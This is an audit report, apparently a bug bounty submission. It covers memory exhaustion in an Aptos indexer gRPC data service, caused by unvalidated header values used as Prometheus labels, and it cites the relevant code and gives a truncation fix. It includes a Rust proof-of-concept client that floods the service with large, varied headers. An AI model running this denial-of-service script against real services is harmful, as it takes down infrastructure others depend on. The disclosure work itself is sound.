# Audit Report

## Title
Unbounded Memory Exhaustion via Unvalidated Prometheus Label Values in Indexer gRPC Data Service

## Summary
The indexer-grpc-data-service exposes Prometheus metrics with label values extracted from gRPC request headers (identifier_type, identifier, email, application_name, processor) without any length validation or sanitization. An attacker can send gRPC requests with arbitrarily long header values and/or high cardinality combinations, causing unbounded memory growth in Prometheus and eventual service crash via out-of-memory conditions.

## Finding Description

The vulnerability exists in the metrics collection system of the indexer-grpc-data-service. The attack flow is as follows:

**Step 1: Header Extraction Without Validation** [1](#0-0) 

The `get_request_metadata()` function extracts gRPC headers and converts them to strings without any length limits. The function uses `.to_str().unwrap_or("unspecified")` which accepts any valid UTF-8 string up to the HTTP/2 header size limits (typically 8-16KB per header, potentially more).

**Step 2: Direct Usage as Prometheus Labels** [2](#0-1) 

The extracted values are returned directly as label values for Prometheus metrics without any truncation or validation.

**Step 3: Metrics Registration with Unvalidated Labels** [3](#0-2) 

Multiple metrics are registered with these five label dimensions. Each metric call creates a new time series for each unique combination of label values.

**Step 4: Unbounded Memory Growth** [4](#0-3) 

Every request that reaches the data service updates metrics with the unvalidated label values. Prometheus stores each unique combination of label values as a separate time series in memory, and the label values themselves are stored as strings.

**Attack Scenario:**
1. Attacker sends gRPC `GetTransactions` requests to the data service
2. Each request includes custom headers with long strings (e.g., 8KB strings for each of the 5 headers)
3. Attacker varies the header values across requests to maximize cardinality
4. Each unique combination creates new Prometheus time series with 40KB+ of label data
5. Memory grows unboundedly until the service crashes with OOM

The service has no authentication enforcement (deprecated auth fields) [5](#0-4)  and no header validation, making this trivially exploitable.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty criteria:

- **API crashes**: The data service will crash due to out-of-memory conditions when Prometheus metrics exhaust available memory
- **Validator node slowdowns**: If the data service runs on the same infrastructure as validators (common in full node setups), memory exhaustion can impact validator performance

The attack causes a Denial-of-Service condition affecting the indexer infrastructure's availability. While it doesn't directly compromise consensus or cause loss of funds, it disrupts critical data services that applications depend on for blockchain interaction.

## Likelihood Explanation

**Likelihood: High**

The attack is trivially exploitable:
- No authentication required (auth system is deprecated)
- Simple gRPC client can send requests with custom headers
- No rate limiting on metric cardinality
- No monitoring alerts for abnormal label cardinality
- HTTP/2 allows headers of 8-16KB or more by default
- Attacker can send requests from multiple IPs/connections to accelerate the attack

The attack can be automated and executed remotely by any network-accessible client.

## Recommendation

Implement strict validation and sanitization for all label values before passing them to Prometheus:

```rust
// In ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs

const MAX_LABEL_LENGTH: usize = 64; // Reasonable limit for identifiers

impl IndexerGrpcRequestMetadata {
    pub fn get_label_values(&self) -> Vec<String> {
        vec![
            truncate_label(&self.request_identifier_type),
            truncate_label(&self.request_identifier),
            truncate_label(&self.request_email),
            truncate_label(&self.request_application_name),
            truncate_label(&self.processor_name),
        ]
    }
}

fn truncate_label(value: &str) -> String {
    if value.len() > MAX_LABEL_LENGTH {
        format!("{}...", &value[..MAX_LABEL_LENGTH])
    } else {
        value.to_string()
    }
}
```

Additionally:
1. Add cardinality limits to Prometheus metrics (consider using metric aggregation)
2. Implement monitoring for abnormal metric cardinality growth
3. Add rate limiting per client IP/identifier
4. Consider hashing long identifiers instead of using them directly as labels
5. Re-enable or implement proper authentication for the data service

## Proof of Concept

```rust
// PoC: Rust gRPC client to exploit the vulnerability
use tonic::{Request, metadata::MetadataValue};
use aptos_protos::indexer::v1::{raw_data_client::RawDataClient, GetTransactionsRequest};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut client = RawDataClient::connect("http://[data-service-endpoint]:50051").await?;
    
    // Create large strings for headers (8KB each)
    let large_string = "A".repeat(8192);
    
    // Send many requests with different header combinations
    for i in 0..1000 {
        let mut request = Request::new(GetTransactionsRequest {
            starting_version: Some(0),
            transactions_count: Some(1),
            ..Default::default()
        });
        
        // Vary the headers to maximize cardinality
        let metadata = request.metadata_mut();
        metadata.insert("x-aptos-identifier-type", 
            MetadataValue::from_str(&format!("{}{}", large_string, i))?);
        metadata.insert("x-aptos-identifier", 
            MetadataValue::from_str(&format!("{}{}", large_string, i))?);
        metadata.insert("x-aptos-email", 
            MetadataValue::from_str(&format!("{}{}", large_string, i))?);
        metadata.insert("x-aptos-application-name", 
            MetadataValue::from_str(&format!("{}{}", large_string, i))?);
        metadata.insert("x-aptos-request-name", 
            MetadataValue::from_str(&format!("{}{}", large_string, i))?);
        
        // Each request creates ~40KB of label data
        // 1000 requests = 40MB+ of metric label data
        let _ = client.get_transactions(request).await;
        
        println!("Sent request {} - memory growing...", i);
    }
    
    println!("Attack complete. Monitor service memory usage.");
    Ok(())
}
```

Expected result: The data service's memory usage grows continuously as Prometheus stores each unique combination of label values. With sufficient requests, the service will crash with OOM.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L57-69)
```rust
impl IndexerGrpcRequestMetadata {
    /// Get the label values for use with metrics that use these labels. Note, the
    /// order must match the order in metrics.rs.
    pub fn get_label_values(&self) -> Vec<&str> {
        vec![
            &self.request_identifier_type,
            &self.request_identifier,
            &self.request_email,
            &self.request_application_name,
            &self.processor_name,
        ]
    }
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L72-106)
```rust
pub fn get_request_metadata(req: &Request<GetTransactionsRequest>) -> IndexerGrpcRequestMetadata {
    let request_metadata_pairs = vec![
        (
            "request_identifier_type",
            REQUEST_HEADER_APTOS_IDENTIFIER_TYPE,
        ),
        ("request_identifier", REQUEST_HEADER_APTOS_IDENTIFIER),
        ("request_email", REQUEST_HEADER_APTOS_EMAIL),
        (
            "request_application_name",
            REQUEST_HEADER_APTOS_APPLICATION_NAME,
        ),
        ("request_token", GRPC_AUTH_TOKEN_HEADER),
        ("processor_name", GRPC_REQUEST_NAME_HEADER),
    ];
    let mut request_metadata_map: HashMap<String, String> = request_metadata_pairs
        .into_iter()
        .map(|(key, value)| {
            (
                key.to_string(),
                req.metadata()
                    .get(value)
                    .map(|value| value.to_str().unwrap_or("unspecified").to_string())
                    .unwrap_or("unspecified".to_string()),
            )
        })
        .collect();
    request_metadata_map.insert(
        "request_connection_id".to_string(),
        Uuid::new_v4().to_string(),
    );

    // TODO: update the request name if these are internal requests.
    serde_json::from_str(&serde_json::to_string(&request_metadata_map).unwrap()).unwrap()
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/metrics.rs (L14-27)
```rust
pub static LATEST_PROCESSED_VERSION_PER_PROCESSOR: Lazy<IntGaugeVec> = Lazy::new(|| {
    register_int_gauge_vec!(
        "indexer_grpc_data_service_with_user_latest_processed_version",
        "Latest processed transaction version",
        &[
            "identifier_type",
            "identifier",
            "email",
            "application_name",
            "processor"
        ],
    )
    .unwrap()
});
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L548-558)
```rust
                LATEST_PROCESSED_VERSION_PER_PROCESSOR
                    .with_label_values(&request_metadata.get_label_values())
                    .set(end_of_batch_version as i64);
                PROCESSED_VERSIONS_COUNT_PER_PROCESSOR
                    .with_label_values(&request_metadata.get_label_values())
                    .inc_by(current_batch_size as u64);
                if let Some(data_latency_in_secs) = data_latency_in_secs {
                    PROCESSED_LATENCY_IN_SECS_PER_PROCESSOR
                        .with_label_values(&request_metadata.get_label_values())
                        .set(data_latency_in_secs);
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L58-63)
```rust
    /// Deprecated: a list of auth tokens that are allowed to access the service.
    #[serde(default)]
    pub whitelisted_auth_tokens: Vec<String>,
    /// Deprecated: if set, don't check for auth tokens.
    #[serde(default)]
    pub disable_auth_check: bool,
```
